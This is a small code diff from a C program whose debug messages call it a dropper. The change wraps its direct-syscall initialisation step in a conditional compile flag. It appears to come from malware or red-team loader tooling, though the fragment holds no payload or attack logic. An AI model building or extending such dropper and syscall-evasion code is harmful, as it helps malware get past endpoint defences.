@@ -6,10 +6,12 @@ int main() {
     DebugPrint("Debug mode enabled.\n");
     DebugPrint("Dropper started...\n");
 
+#ifdef SYSCALL_ENABLED
     if (!InitializeSyscalls()) {
         DebugPrint("[X] Failed to initialize syscalls.\n");
         return FALSE;
     }
+#endif
 
     DebugPrint("\n### Setup Complete ###\n\n");
 
